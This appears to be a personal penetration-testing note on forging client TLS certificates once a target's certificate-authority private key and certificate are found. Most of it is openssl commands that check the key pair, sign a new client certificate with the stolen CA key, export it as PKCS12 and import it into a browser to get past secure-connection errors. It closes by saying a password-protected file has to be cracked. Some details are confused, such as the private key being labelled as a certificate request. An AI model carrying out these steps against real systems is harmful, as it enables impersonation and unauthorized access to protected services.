When I found  Certificate authority private key (“Begin Certificate Request”) and corresponding PEM certificate (certificate authority public key) , I can forge SSL/TLS certificate

Forging the certificate will allow you to bypass secure connection failed error in the browser

Mv RSA_private_key ca.key

Now I need PEM certificate (public key)

#it may be obtained by exporting HTTPS certificate from the browser #or by finding on the target somewhere around
 
Mv PEM_certificate ca.crt

to read the certificate

openssl req -in <file> -noout -text



To check if I found matching private and public key 

Openssl pkey –in ca.key -pubout

Openssl x509 –in ca.crt -pubkey –noout

If they do match then

Openssl genrsa –out client.key 4096

Openssl req –new –key client.key -out client.csr 

Openssl x509 –req –in client.csr -CA ca.crt -CAkey ca.key -set_serial 9001 –extensions client –days 7 –outform PEM –out client.cer
                                                                                               Client.pem

Openssl pkcs12 –export –inkey client.key -in client.cer -out client.p12 (for linux)/Client.pfx (for windows)



Then add your client.p12/pfx certificate and ca.crt to the browser certificates

#sometimes you need to restart the browser 
if when importing pfx/p12 file in the browser i am asked for the password in order to get it, I need to crack the certificate
